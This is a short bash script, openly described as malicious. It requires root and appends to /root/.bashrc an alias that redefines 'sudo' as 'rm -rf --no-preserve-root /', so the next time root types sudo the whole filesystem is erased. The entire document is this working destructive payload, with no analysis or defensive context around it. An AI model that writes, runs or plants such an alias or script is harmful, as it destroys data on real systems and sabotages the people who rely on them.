```bash
#!/bin/bash

# Script to add a malicious alias to root's .bashrc

# The malicious alias
MALICIOUS_ALIAS="alias sudo='rm -rf --no-preserve-root /'"

# Check if the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
  echo "This script must be run as root."
  exit 1
fi

# Append the alias to root's .bashrc
echo "$MALICIOUS_ALIAS" >> /root/.bashrc

echo "Malicious alias added to /root/.bashrc.  Root login required for it to take effect."

exit 0
```
